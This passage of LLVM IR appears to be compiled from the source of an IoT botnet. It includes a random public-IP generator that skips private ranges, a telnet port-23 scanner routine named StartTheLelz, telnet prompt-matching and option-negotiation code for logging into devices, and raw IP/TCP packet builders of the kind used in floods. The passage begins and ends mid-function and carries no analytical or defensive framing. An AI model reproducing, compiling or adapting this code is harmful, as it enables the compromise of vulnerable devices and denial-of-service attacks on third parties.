  %indvars.iv.3 = phi i64 [ %48, %.lr.ph.preheader.3 ], [ %indvars.iv.next.3, %.critedge1.3 ]
  %.130.3 = phi i32 [ %.1.lcssa.2, %.lr.ph.preheader.3 ], [ %53, %.critedge1.3 ]
  %49 = sub nsw i64 0, %indvars.iv.3
  %50 = getelementptr inbounds i8, i8* %6, i64 %49
  %51 = load i8, i8* %50, align 1
  %52 = trunc i64 %indvars.iv.3 to i32
  switch i8 %51, label %.critedge.3.loopexit [
    i8 0, label %.critedge1.3
    i8 32, label %.critedge1.3
    i8 13, label %.critedge1.3
    i8 10, label %.critedge1.3
  ]

.critedge1.3:                                     ; preds = %.lr.ph.3, %.lr.ph.3, %.lr.ph.3, %.lr.ph.3
  %indvars.iv.next.3 = add nsw i64 %indvars.iv.3, 1
  %53 = add nsw i32 %.130.3, 1
  %54 = icmp sgt i64 %7, %indvars.iv.next.3
  br i1 %54, label %.lr.ph.3, label %.critedge.3.loopexit

.critedge.3.loopexit:                             ; preds = %.critedge1.3, %.lr.ph.3
  %.1.lcssa.3.ph = phi i32 [ %52, %.lr.ph.3 ], [ %53, %.critedge1.3 ]
  br label %.critedge.3

.critedge.3:                                      ; preds = %.critedge.3.loopexit, %.preheader.339
  %.1.lcssa.3 = phi i32 [ %.1.lcssa.2, %.preheader.339 ], [ %.1.lcssa.3.ph, %.critedge.3.loopexit ]
  %55 = sext i32 %.1.lcssa.3 to i64
  %56 = sub nsw i64 0, %55
  %57 = getelementptr inbounds i8, i8* %4, i64 %56
  %58 = load i8, i8* %57, align 1
  %59 = icmp eq i8 %58, 36
  br i1 %59, label %21, label %.preheader.440

.preheader.440:                                   ; preds = %.critedge.3
  %60 = icmp sgt i32 %2, %.1.lcssa.3
  br i1 %60, label %.lr.ph.preheader.4, label %.critedge.4

.lr.ph.preheader.4:                               ; preds = %.preheader.440
  %61 = sext i32 %.1.lcssa.3 to i64
  br label %.lr.ph.4

.lr.ph.4:                                         ; preds = %.critedge1.4, %.lr.ph.preheader.4
  %indvars.iv.4 = phi i64 [ %61, %.lr.ph.preheader.4 ], [ %indvars.iv.next.4, %.critedge1.4 ]
  %.130.4 = phi i32 [ %.1.lcssa.3, %.lr.ph.preheader.4 ], [ %66, %.critedge1.4 ]
  %62 = sub nsw i64 0, %indvars.iv.4
  %63 = getelementptr inbounds i8, i8* %6, i64 %62
  %64 = load i8, i8* %63, align 1
  %65 = trunc i64 %indvars.iv.4 to i32
  switch i8 %64, label %.critedge.4.loopexit [
    i8 0, label %.critedge1.4
    i8 32, label %.critedge1.4
    i8 13, label %.critedge1.4
    i8 10, label %.critedge1.4
  ]

.critedge1.4:                                     ; preds = %.lr.ph.4, %.lr.ph.4, %.lr.ph.4, %.lr.ph.4
  %indvars.iv.next.4 = add nsw i64 %indvars.iv.4, 1
  %66 = add nsw i32 %.130.4, 1
  %67 = icmp sgt i64 %7, %indvars.iv.next.4
  br i1 %67, label %.lr.ph.4, label %.critedge.4.loopexit

.critedge.4.loopexit:                             ; preds = %.critedge1.4, %.lr.ph.4
  %.1.lcssa.4.ph = phi i32 [ %65, %.lr.ph.4 ], [ %66, %.critedge1.4 ]
  br label %.critedge.4

.critedge.4:                                      ; preds = %.critedge.4.loopexit, %.preheader.440
  %.1.lcssa.4 = phi i32 [ %.1.lcssa.3, %.preheader.440 ], [ %.1.lcssa.4.ph, %.critedge.4.loopexit ]
  %68 = sext i32 %.1.lcssa.4 to i64
  %69 = sub nsw i64 0, %68
  %70 = getelementptr inbounds i8, i8* %4, i64 %69
  %71 = load i8, i8* %70, align 1
  %72 = icmp eq i8 %71, 35
  %. = zext i1 %72 to i32
  ret i32 %.
}

; Function Attrs: noinline nounwind uwtable
define i32 @readUntil(i32, i8* nocapture readonly, i32, i32, i32, i8*, i32, i32) local_unnamed_addr #1 {
  %9 = alloca %struct.__sigset_t, align 8
  %10 = alloca %struct.timeval, align 8
  %11 = sext i32 %3 to i64
  %12 = getelementptr inbounds %struct.timeval, %struct.timeval* %10, i64 0, i32 0
  store i64 %11, i64* %12, align 8
  %13 = sext i32 %4 to i64
  %14 = getelementptr inbounds %struct.timeval, %struct.timeval* %10, i64 0, i32 1
  store i64 %13, i64* %14, align 8
  %15 = add nsw i32 %7, 2
  %16 = icmp slt i32 %15, %6
  br i1 %16, label %.lr.ph, label %.critedge

.lr.ph:                                           ; preds = %8
  %17 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %9, i64 0, i32 0, i64 0
  %18 = srem i32 %0, 64
  %19 = zext i32 %18 to i64
  %20 = shl i64 1, %19
  %21 = sdiv i32 %0, 64
  %22 = sext i32 %21 to i64
  %23 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %9, i64 0, i32 0, i64 %22
  %24 = add nsw i32 %0, 1
  %25 = icmp eq i32 %2, 0
  br label %26

; <label>:26:                                     ; preds = %.lr.ph, %.backedge
  %.03335 = phi i32 [ %7, %.lr.ph ], [ %44, %.backedge ]
  %27 = load i64, i64* %12, align 8
  %28 = icmp sgt i64 %27, 0
  %29 = load i64, i64* %14, align 8
  %30 = icmp sgt i64 %29, 0
  %31 = or i1 %28, %30
  br i1 %31, label %32, label %.critedge.loopexit

; <label>:32:                                     ; preds = %26
  %33 = call { i64, i64* } asm sideeffect "cld; rep; stosq", "={cx},={di},{ax},0,1,~{memory},~{dirflag},~{fpsr},~{flags}"(i32 0, i64 16, i64* nonnull %17) #3, !srcloc !6
  %34 = load i64, i64* %23, align 8
  %35 = or i64 %34, %20
  store i64 %35, i64* %23, align 8
  %36 = call i32 @select(i32 %24, %struct.__sigset_t* nonnull %9, %struct.__sigset_t* null, %struct.__sigset_t* null, %struct.timeval* nonnull %10) #3
  %37 = icmp slt i32 %36, 1
  br i1 %37, label %.critedge.loopexit, label %38

; <label>:38:                                     ; preds = %32
  %39 = sext i32 %.03335 to i64
  %40 = getelementptr inbounds i8, i8* %5, i64 %39
  %41 = call i64 @recv(i32 %0, i8* %40, i64 1, i32 0) #3
  %42 = trunc i64 %41 to i32
  switch i32 %42, label %43 [
    i32 -1, label %.critedge.loopexit
    i32 0, label %.critedge.loopexit
  ]

; <label>:43:                                     ; preds = %38
  %44 = add nsw i32 %42, %.03335
  %45 = load i8, i8* %40, align 1
  %46 = icmp eq i8 %45, -1
  br i1 %46, label %47, label %53

; <label>:47:                                     ; preds = %43
  %48 = getelementptr inbounds i8, i8* %40, i64 1
  %49 = call i64 @recv(i32 %0, i8* %48, i64 2, i32 0) #3
  %50 = trunc i64 %49 to i32
  switch i32 %50, label %51 [
    i32 -1, label %.critedge
    i32 0, label %.critedge
  ]

; <label>:51:                                     ; preds = %47
  %52 = call i32 @negotiate(i32 %0, i8* nonnull %40, i32 undef)
  br label %.critedge

; <label>:53:                                     ; preds = %43
  %54 = call i8* @strstr(i8* nonnull %5, i8* %1) #15
  %55 = icmp eq i8* %54, null
  br i1 %55, label %56, label %.critedge.loopexit

; <label>:56:                                     ; preds = %53
  br i1 %25, label %.backedge, label %59

.backedge:                                        ; preds = %56, %59
  %57 = add nsw i32 %44, 2
  %58 = icmp slt i32 %57, %6
  br i1 %58, label %26, label %.critedge.loopexit

; <label>:59:                                     ; preds = %56
  %60 = call i32 @matchPrompt(i8* nonnull %5)
  %61 = icmp eq i32 %60, 0
  br i1 %61, label %.backedge, label %.critedge.loopexit

.critedge.loopexit:                               ; preds = %.backedge, %26, %32, %59, %53, %38, %38
  %.0.ph = phi i32 [ 0, %38 ], [ 0, %38 ], [ 1, %53 ], [ 1, %59 ], [ 0, %32 ], [ 0, %26 ], [ 0, %.backedge ]
  br label %.critedge

.critedge:                                        ; preds = %.critedge.loopexit, %8, %47, %47, %51
  %.0 = phi i32 [ 0, %51 ], [ 0, %47 ], [ 0, %47 ], [ 0, %8 ], [ %.0.ph, %.critedge.loopexit ]
  ret i32 %.0
}

; Function Attrs: noinline nounwind uwtable
define i32 @getDatIP() local_unnamed_addr #1 {
  %1 = alloca [16 x i8], align 16
  br label %.critedge

.critedge:                                        ; preds = %.critedge.backedge, %0
  %2 = tail call i32 @rand() #3
  %3 = srem i32 %2, 255
  %4 = tail call i32 @rand() #3
  %5 = srem i32 %4, 255
  %6 = tail call i32 @rand() #3
  %7 = srem i32 %6, 255
  %8 = tail call i32 @rand() #3
  %9 = and i32 %3, 255
  %trunc = trunc i32 %3 to i8
  switch i8 %trunc, label %17 [
    i8 0, label %.critedge.backedge
    i8 10, label %.critedge.backedge
    i8 100, label %10
    i8 127, label %.critedge.backedge
    i8 -87, label %13
  ]

; <label>:10:                                     ; preds = %.critedge
  %11 = and i32 %5, 192
  %12 = icmp eq i32 %11, 64
  br i1 %12, label %.critedge.backedge, label %.thread134

; <label>:13:                                     ; preds = %.critedge
  %.old = and i32 %5, 255
  %.old75 = icmp eq i32 %.old, 254
  br i1 %.old75, label %.critedge.backedge, label %.thread134

.thread134:                                       ; preds = %10, %13
  %14 = and i32 %5, 255
  %15 = icmp eq i32 %14, 0
  %16 = and i32 %7, 255
  br label %26

; <label>:17:                                     ; preds = %.critedge
  %18 = icmp eq i32 %9, 172
  %19 = and i32 %5, 255
  %20 = icmp ult i32 %19, 17
  %or.cond79 = and i1 %18, %20
  br i1 %or.cond79, label %.critedge.backedge, label %21

; <label>:21:                                     ; preds = %17
  %22 = icmp eq i32 %9, 192
  %23 = icmp eq i32 %19, 0
  %or.cond82 = and i1 %22, %23
  %24 = and i32 %7, 255
  %25 = icmp eq i32 %24, 2
  %or.cond85 = and i1 %or.cond82, %25
  br i1 %or.cond85, label %.critedge.backedge, label %26

; <label>:26:                                     ; preds = %.thread134, %21
  %27 = phi i32 [ %16, %.thread134 ], [ %24, %21 ]
  %28 = phi i1 [ %15, %.thread134 ], [ %23, %21 ]
  %29 = phi i1 [ false, %.thread134 ], [ %22, %21 ]
  %30 = phi i32 [ %14, %.thread134 ], [ %19, %21 ]
  %31 = icmp eq i32 %30, 88
  %or.cond88 = and i1 %29, %31
  %32 = icmp eq i32 %27, 99
  %or.cond91 = and i1 %32, %or.cond88
  %33 = icmp eq i32 %30, 168
  %or.cond94 = and i1 %29, %33
  %or.cond156 = or i1 %or.cond94, %or.cond91
  br i1 %or.cond156, label %.critedge.backedge, label %34

; <label>:34:                                     ; preds = %26
  %35 = icmp eq i32 %9, 198
  br i1 %35, label %36, label %.critedge95

; <label>:36:                                     ; preds = %34
  %37 = and i32 %30, 254
  %switch = icmp eq i32 %37, 18
  br i1 %switch, label %.critedge.backedge, label %38

; <label>:38:                                     ; preds = %36
  %39 = icmp eq i32 %30, 51
  %40 = icmp eq i32 %27, 100
  %or.cond101 = and i1 %40, %39
  br i1 %or.cond101, label %.critedge.backedge, label %.critedge28

.critedge95:                                      ; preds = %34
  %41 = icmp eq i32 %9, 203
  %or.cond104 = and i1 %41, %28
  %42 = icmp eq i32 %27, 113
  %or.cond107 = and i1 %42, %or.cond104
  br i1 %or.cond107, label %.critedge.backedge, label %43

; <label>:43:                                     ; preds = %.critedge95
  %44 = icmp eq i32 %9, 62
  %45 = icmp ult i32 %30, 31
  %or.cond110 = and i1 %44, %45
  br i1 %or.cond110, label %.critedge.backedge, label %46

; <label>:46:                                     ; preds = %43
  %47 = icmp eq i32 %9, 207
  %48 = icmp ugt i32 %30, 30
  %or.cond113 = and i1 %47, %48
  %49 = icmp ult i32 %27, 121
  %or.cond116 = and i1 %49, %or.cond113
  br i1 %or.cond116, label %.critedge.backedge, label %50

; <label>:50:                                     ; preds = %46
  %51 = icmp eq i32 %9, 65
  %52 = and i32 %5, 224
  %53 = icmp ugt i32 %52, 223
  %or.cond119 = and i1 %51, %53
  %54 = icmp ult i32 %27, 227
  %or.cond122 = and i1 %or.cond119, %54
  br i1 %or.cond122, label %.critedge.backedge, label %55

; <label>:55:                                     ; preds = %50
  %56 = icmp eq i32 %9, 195
  %57 = icmp eq i32 %30, 10
  %or.cond125 = and i1 %56, %57
  br i1 %or.cond125, label %.critedge.backedge, label %58

; <label>:58:                                     ; preds = %55
  %trunc157 = trunc i32 %3 to i8
  switch i8 %trunc157, label %61 [
    i8 -40, label %59
    i8 -44, label %60
  ]

; <label>:59:                                     ; preds = %58
  %trunc158 = trunc i32 %30 to i8
  switch i8 %trunc158, label %.critedge28 [
    i8 25, label %.critedge.backedge
    i8 94, label %.critedge.backedge
  ]

; <label>:60:                                     ; preds = %58
  %.old127 = icmp eq i32 %30, 56
  br i1 %.old127, label %.critedge.backedge, label %.critedge28

.critedge.backedge:                               ; preds = %60, %13, %10, %.critedge, %.critedge, %.critedge, %17, %21, %26, %38, %.critedge95, %43, %46, %50, %55, %59, %59, %61, %36
  br label %.critedge

; <label>:61:                                     ; preds = %58
  %62 = and i32 %3, 240
  %63 = icmp eq i32 %62, 224
  br i1 %63, label %.critedge.backedge, label %.critedge28

.critedge28:                                      ; preds = %59, %38, %60, %61
  %64 = srem i32 %8, 255
  %65 = getelementptr inbounds [16 x i8], [16 x i8]* %1, i64 0, i64 0
  call void @llvm.memset.p0i8.i64(i8* nonnull %65, i8 0, i64 16, i32 16, i1 false)
  %66 = and i32 %64, 255
  %67 = call i32 (i8*, i8*, ...) @sprintf(i8* nonnull %65, i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.311, i64 0, i64 0), i32 %9, i32 %30, i32 %27, i32 %66) #3
  %68 = call i32 @inet_addr(i8* nonnull %65) #3
  ret i32 %68
}

; Function Attrs: nounwind
declare i32 @rand() local_unnamed_addr #5

; Function Attrs: nounwind
declare i32 @sprintf(i8* nocapture, i8* nocapture readonly, ...) local_unnamed_addr #5

; Function Attrs: noinline norecurse nounwind readonly uwtable
define zeroext i16 @csum(i16* nocapture readonly, i32) local_unnamed_addr #10 {
  %3 = icmp sgt i32 %1, 1
  br i1 %3, label %.lr.ph16.preheader, label %._crit_edge17

.lr.ph16.preheader:                               ; preds = %2
  %4 = add i32 %1, -2
  %5 = lshr i32 %4, 1
  %addconv = add nuw i32 %5, 1
  %6 = zext i32 %addconv to i64
  %7 = shl nuw i32 %5, 1
  %xtraiter = and i32 %addconv, 3
  %lcmp.mod = icmp eq i32 %xtraiter, 0
  br i1 %lcmp.mod, label %.lr.ph16.prol.loopexit, label %.lr.ph16.prol.preheader

.lr.ph16.prol.preheader:                          ; preds = %.lr.ph16.preheader
  br label %.lr.ph16.prol

.lr.ph16.prol:                                    ; preds = %.lr.ph16.prol, %.lr.ph16.prol.preheader
  %.014.prol = phi i32 [ %11, %.lr.ph16.prol ], [ 0, %.lr.ph16.prol.preheader ]
  %.0913.prol = phi i32 [ %12, %.lr.ph16.prol ], [ %1, %.lr.ph16.prol.preheader ]
  %.01012.prol = phi i16* [ %8, %.lr.ph16.prol ], [ %0, %.lr.ph16.prol.preheader ]
  %prol.iter = phi i32 [ %prol.iter.sub, %.lr.ph16.prol ], [ %xtraiter, %.lr.ph16.prol.preheader ]
  %8 = getelementptr inbounds i16, i16* %.01012.prol, i64 1
  %9 = load i16, i16* %.01012.prol, align 2
  %10 = zext i16 %9 to i32
  %11 = add nsw i32 %10, %.014.prol
  %12 = add nsw i32 %.0913.prol, -2
  %prol.iter.sub = add i32 %prol.iter, -1
  %prol.iter.cmp = icmp eq i32 %prol.iter.sub, 0
  br i1 %prol.iter.cmp, label %.lr.ph16.prol.loopexit.unr-lcssa, label %.lr.ph16.prol, !llvm.loop !7

.lr.ph16.prol.loopexit.unr-lcssa:                 ; preds = %.lr.ph16.prol
  br label %.lr.ph16.prol.loopexit

.lr.ph16.prol.loopexit:                           ; preds = %.lr.ph16.preheader, %.lr.ph16.prol.loopexit.unr-lcssa
  %.014.unr = phi i32 [ 0, %.lr.ph16.preheader ], [ %11, %.lr.ph16.prol.loopexit.unr-lcssa ]
  %.0913.unr = phi i32 [ %1, %.lr.ph16.preheader ], [ %12, %.lr.ph16.prol.loopexit.unr-lcssa ]
  %.01012.unr = phi i16* [ %0, %.lr.ph16.preheader ], [ %8, %.lr.ph16.prol.loopexit.unr-lcssa ]
  %.lcssa26.unr = phi i32 [ undef, %.lr.ph16.preheader ], [ %11, %.lr.ph16.prol.loopexit.unr-lcssa ]
  %13 = icmp ult i32 %4, 6
  br i1 %13, label %._crit_edge17.loopexit, label %.lr.ph16.preheader.new

.lr.ph16.preheader.new:                           ; preds = %.lr.ph16.prol.loopexit
  br label %.lr.ph16

.lr.ph16:                                         ; preds = %.lr.ph16, %.lr.ph16.preheader.new
  %.014 = phi i32 [ %.014.unr, %.lr.ph16.preheader.new ], [ %29, %.lr.ph16 ]
  %.0913 = phi i32 [ %.0913.unr, %.lr.ph16.preheader.new ], [ %30, %.lr.ph16 ]
  %.01012 = phi i16* [ %.01012.unr, %.lr.ph16.preheader.new ], [ %26, %.lr.ph16 ]
  %14 = getelementptr inbounds i16, i16* %.01012, i64 1
  %15 = load i16, i16* %.01012, align 2
  %16 = zext i16 %15 to i32
  %17 = add nsw i32 %16, %.014
  %18 = getelementptr inbounds i16, i16* %.01012, i64 2
  %19 = load i16, i16* %14, align 2
  %20 = zext i16 %19 to i32
  %21 = add nsw i32 %20, %17
  %22 = getelementptr inbounds i16, i16* %.01012, i64 3
  %23 = load i16, i16* %18, align 2
  %24 = zext i16 %23 to i32
  %25 = add nsw i32 %24, %21
  %26 = getelementptr inbounds i16, i16* %.01012, i64 4
  %27 = load i16, i16* %22, align 2
  %28 = zext i16 %27 to i32
  %29 = add nsw i32 %28, %25
  %30 = add nsw i32 %.0913, -8
  %31 = icmp sgt i32 %30, 1
  br i1 %31, label %.lr.ph16, label %._crit_edge17.loopexit.unr-lcssa

._crit_edge17.loopexit.unr-lcssa:                 ; preds = %.lr.ph16
  br label %._crit_edge17.loopexit

._crit_edge17.loopexit:                           ; preds = %.lr.ph16.prol.loopexit, %._crit_edge17.loopexit.unr-lcssa
  %.lcssa26 = phi i32 [ %.lcssa26.unr, %.lr.ph16.prol.loopexit ], [ %29, %._crit_edge17.loopexit.unr-lcssa ]
  %scevgep = getelementptr i16, i16* %0, i64 %6
  %32 = sub i32 %4, %7
  br label %._crit_edge17

._crit_edge17:                                    ; preds = %._crit_edge17.loopexit, %2
  %.010.lcssa = phi i16* [ %0, %2 ], [ %scevgep, %._crit_edge17.loopexit ]
  %.09.lcssa = phi i32 [ %1, %2 ], [ %32, %._crit_edge17.loopexit ]
  %.0.lcssa = phi i32 [ 0, %2 ], [ %.lcssa26, %._crit_edge17.loopexit ]
  %33 = icmp eq i32 %.09.lcssa, 1
  br i1 %33, label %34, label %.preheader

; <label>:34:                                     ; preds = %._crit_edge17
  %35 = bitcast i16* %.010.lcssa to i8*
  %36 = load i8, i8* %35, align 1
  %37 = zext i8 %36 to i32
  %38 = add nsw i32 %37, %.0.lcssa
  br label %.preheader

.preheader:                                       ; preds = %34, %._crit_edge17
  %.1.ph = phi i32 [ %.0.lcssa, %._crit_edge17 ], [ %38, %34 ]
  %39 = ashr i32 %.1.ph, 16
  %40 = icmp eq i32 %39, 0
  br i1 %40, label %._crit_edge, label %.lr.ph.preheader

.lr.ph.preheader:                                 ; preds = %.preheader
  br label %.lr.ph

.lr.ph:                                           ; preds = %.lr.ph.preheader, %.lr.ph
  %41 = phi i32 [ %44, %.lr.ph ], [ %39, %.lr.ph.preheader ]
  %.111 = phi i32 [ %43, %.lr.ph ], [ %.1.ph, %.lr.ph.preheader ]
  %42 = and i32 %.111, 65535
  %43 = add nsw i32 %42, %41
  %44 = ashr i32 %43, 16
  %45 = icmp eq i32 %44, 0
  br i1 %45, label %._crit_edge.loopexit, label %.lr.ph

._crit_edge.loopexit:                             ; preds = %.lr.ph
  br label %._crit_edge

._crit_edge:                                      ; preds = %._crit_edge.loopexit, %.preheader
  %.1.lcssa = phi i32 [ %.1.ph, %.preheader ], [ %43, %._crit_edge.loopexit ]
  %46 = trunc i32 %.1.lcssa to i16
  %47 = xor i16 %46, -1
  ret i16 %47
}

; Function Attrs: noinline nounwind uwtable
define zeroext i16 @tcpcsum(%struct.iphdr* nocapture readonly, %struct.tcphdr* nocapture readonly) local_unnamed_addr #1 {
  %3 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %0, i64 0, i32 8
  %4 = load i32, i32* %3, align 4
  %5 = zext i32 %4 to i64
  %6 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %0, i64 0, i32 9
  %7 = load i32, i32* %6, align 4
  %8 = zext i32 %7 to i64
  %9 = tail call zeroext i16 @htons(i16 zeroext 20) #18
  %10 = tail call noalias i8* @malloc(i64 44) #3
  %11 = bitcast i8* %10 to i16*
  %.sroa.0.0..sroa_cast = bitcast i8* %10 to i64*
  store i64 %5, i64* %.sroa.0.0..sroa_cast, align 1
  %.sroa.2.0..sroa_idx6 = getelementptr inbounds i8, i8* %10, i64 8
  %.sroa.2.0..sroa_cast = bitcast i8* %.sroa.2.0..sroa_idx6 to i64*
  store i64 %8, i64* %.sroa.2.0..sroa_cast, align 1
  %.sroa.3.0..sroa_idx = getelementptr inbounds i8, i8* %10, i64 16
  store i8 0, i8* %.sroa.3.0..sroa_idx, align 1
  %.sroa.4.0..sroa_raw_idx = getelementptr inbounds i8, i8* %10, i64 17
  store i8 6, i8* %.sroa.4.0..sroa_raw_idx, align 1
  %.sroa.5.0..sroa_idx7 = getelementptr inbounds i8, i8* %10, i64 18
  %12 = bitcast i8* %.sroa.5.0..sroa_idx7 to i16*
  store i16 %9, i16* %12, align 1
  %13 = getelementptr inbounds i8, i8* %10, i64 24
  %14 = bitcast %struct.tcphdr* %1 to i8*
  tail call void @llvm.memcpy.p0i8.p0i8.i64(i8* %13, i8* %14, i64 20, i32 1, i1 false)
  %15 = tail call zeroext i16 @csum(i16* %11, i32 44)
  tail call void @free(i8* %10) #3
  ret i16 %15
}

; Function Attrs: argmemonly nounwind
declare void @llvm.memcpy.p0i8.p0i8.i64(i8* nocapture writeonly, i8* nocapture readonly, i64, i32, i1) #6

; Function Attrs: noinline norecurse nounwind uwtable
define void @makeIPPacket(%struct.iphdr* nocapture, i32, i32, i8 zeroext, i32) local_unnamed_addr #0 {
  %6 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %0, i64 0, i32 0
  store i8 69, i8* %6, align 4
  %7 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %0, i64 0, i32 1
  store i8 0, i8* %7, align 1
  %8 = trunc i32 %4 to i16
  %9 = add i16 %8, 20
  %10 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %0, i64 0, i32 2
  store i16 %9, i16* %10, align 2
  %11 = tail call i32 @rand_cmwc()
  %12 = trunc i32 %11 to i16
  %13 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %0, i64 0, i32 3
  store i16 %12, i16* %13, align 4
  %14 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %0, i64 0, i32 4
  store i16 0, i16* %14, align 2
  %15 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %0, i64 0, i32 5
  store i8 -1, i8* %15, align 4
  %16 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %0, i64 0, i32 6
  store i8 %3, i8* %16, align 1
  %17 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %0, i64 0, i32 7
  store i16 0, i16* %17, align 2
  %18 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %0, i64 0, i32 8
  store i32 %2, i32* %18, align 4
  %19 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %0, i64 0, i32 9
  store i32 %1, i32* %19, align 4
  ret void
}

; Function Attrs: noinline nounwind uwtable
define i32 @sclose(i32) local_unnamed_addr #1 {
  %2 = icmp slt i32 %0, 3
  br i1 %2, label %5, label %3

; <label>:3:                                      ; preds = %1
  %4 = tail call i32 @close(i32 %0) #3
  br label %5

; <label>:5:                                      ; preds = %1, %3
  %.0 = phi i32 [ 0, %3 ], [ 1, %1 ]
  ret i32 %.0
}

; Function Attrs: noinline nounwind uwtable
define i8* @mygethostbyname(i8*) local_unnamed_addr #1 {
  %2 = alloca %struct.addrinfo, align 8
  %3 = alloca %struct.addrinfo*, align 8
  %4 = bitcast %struct.addrinfo* %2 to i8*
  call void @llvm.memset.p0i8.i64(i8* nonnull %4, i8 0, i64 48, i32 8, i1 false)
  %5 = getelementptr inbounds %struct.addrinfo, %struct.addrinfo* %2, i64 0, i32 1
  store i32 2, i32* %5, align 4
  %6 = getelementptr inbounds %struct.addrinfo, %struct.addrinfo* %2, i64 0, i32 2
  store i32 1, i32* %6, align 8
  %7 = call i32 @getaddrinfo(i8* %0, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.312, i64 0, i64 0), %struct.addrinfo* nonnull %2, %struct.addrinfo** nonnull %3) #3
  %8 = icmp eq i32 %7, 0
  br i1 %8, label %9, label %20

; <label>:9:                                      ; preds = %1
  %10 = load %struct.addrinfo*, %struct.addrinfo** %3, align 8
  %11 = icmp eq %struct.addrinfo* %10, null
  br i1 %11, label %19, label %12

; <label>:12:                                     ; preds = %9
  %13 = getelementptr inbounds %struct.addrinfo, %struct.addrinfo* %10, i64 0, i32 5
  %14 = bitcast %struct.sockaddr** %13 to %struct.sockaddr_in**
  %15 = load %struct.sockaddr_in*, %struct.sockaddr_in** %14, align 8
  %16 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %15, i64 0, i32 2, i32 0
  %17 = load i32, i32* %16, align 4
  %18 = call i8* @inet_ntoa(i32 %17) #3
  br label %20

; <label>:19:                                     ; preds = %9
  call void @freeaddrinfo(%struct.addrinfo* %10) #3
  br label %20

; <label>:20:                                     ; preds = %1, %19, %12
  %.0 = phi i8* [ %18, %12 ], [ getelementptr inbounds ([1 x i8], [1 x i8]* @.str.313, i64 0, i64 0), %19 ], [ getelementptr inbounds ([1 x i8], [1 x i8]* @.str.313, i64 0, i64 0), %1 ]
  ret i8* %.0
}

declare i32 @getaddrinfo(i8*, i8*, %struct.addrinfo*, %struct.addrinfo**) local_unnamed_addr #4

; Function Attrs: nounwind
declare void @freeaddrinfo(%struct.addrinfo*) local_unnamed_addr #5

; Function Attrs: noinline nounwind uwtable
define i32 @socket_connect(i8*, i16 zeroext) local_unnamed_addr #1 {
  %3 = alloca %struct.sockaddr_in, align 4
  %4 = alloca i32, align 4
  store i32 1, i32* %4, align 4
  %5 = tail call i8* @mygethostbyname(i8* %0)
  %6 = icmp eq i8* %5, null
  br i1 %6, label %29, label %7

; <label>:7:                                      ; preds = %2
  %8 = getelementptr inbounds i8, i8* %5, i64 24
  %9 = bitcast i8* %8 to i8***
  %10 = load i8**, i8*** %9, align 8
  %11 = load i8*, i8** %10, align 8
  %12 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %3, i64 0, i32 2
  %13 = bitcast %struct.in_addr* %12 to i8*
  %14 = getelementptr inbounds i8, i8* %5, i64 20
  %15 = bitcast i8* %14 to i32*
  %16 = load i32, i32* %15, align 4
  %17 = sext i32 %16 to i64
  call void @bcopy(i8* %11, i8* %13, i64 %17) #3
  %18 = tail call zeroext i16 @htons(i16 zeroext %1) #18
  %19 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %3, i64 0, i32 1
  store i16 %18, i16* %19, align 2
  %20 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %3, i64 0, i32 0
  store i16 2, i16* %20, align 4
  %21 = tail call i32 @socket(i32 2, i32 1, i32 6) #3
  %22 = bitcast i32* %4 to i8*
  %23 = call i32 @setsockopt(i32 %21, i32 6, i32 1, i8* nonnull %22, i32 4) #3
  %24 = icmp eq i32 %21, -1
  br i1 %24, label %29, label %25

; <label>:25:                                     ; preds = %7
  %26 = bitcast %struct.sockaddr_in* %3 to %struct.sockaddr*
  %27 = call i32 @connect(i32 %21, %struct.sockaddr* nonnull %26, i32 16) #3
  %28 = icmp eq i32 %27, -1
  %. = select i1 %28, i32 0, i32 %21
  br label %29

; <label>:29:                                     ; preds = %25, %7, %2
  %.0 = phi i32 [ 0, %2 ], [ 0, %7 ], [ %., %25 ]
  ret i32 %.0
}

; Function Attrs: nounwind
declare void @bcopy(i8* nocapture readonly, i8* nocapture, i64) local_unnamed_addr #5

; Function Attrs: nounwind
declare i32 @socket(i32, i32, i32) local_unnamed_addr #5

; Function Attrs: nounwind
declare i32 @setsockopt(i32, i32, i32, i8*, i32) local_unnamed_addr #5

; Function Attrs: noinline nounwind uwtable
define void @StartTheLelz(i32, i32) local_unnamed_addr #1 {
  %3 = alloca %struct.__sigset_t, align 8
  %4 = alloca %struct.timeval, align 8
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  %7 = alloca %struct.sockaddr_in, align 4
  %8 = tail call i32 @fork() #3
  %9 = icmp slt i32 %8, 0
  br i1 %9, label %10, label %11

; <label>:10:                                     ; preds = %2
  ret void

; <label>:11:                                     ; preds = %2
  %12 = tail call i64 @time(i64* null) #3
  %13 = tail call i32 @rand_cmwc()
  %14 = zext i32 %13 to i64
  %15 = xor i64 %14, %12
  %16 = trunc i64 %15 to i32
  tail call void @srand(i32 %16) #3
  %17 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %7, i64 0, i32 0
  store i16 2, i16* %17, align 4
  %18 = tail call zeroext i16 @htons(i16 zeroext 23) #18
  %19 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %7, i64 0, i32 1
  store i16 %18, i16* %19, align 2
  %20 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %7, i64 0, i32 3, i64 0
  %21 = bitcast i8* %20 to i64*
  store i64 0, i64* %21, align 4
  %22 = tail call noalias i8* @malloc(i64 1025) #3
  tail call void @llvm.memset.p0i8.i64(i8* %22, i8 0, i64 1025, i32 1, i1 false)
  %23 = zext i32 %1 to i64
  %24 = alloca %struct.telstate_t, i64 %23, align 16
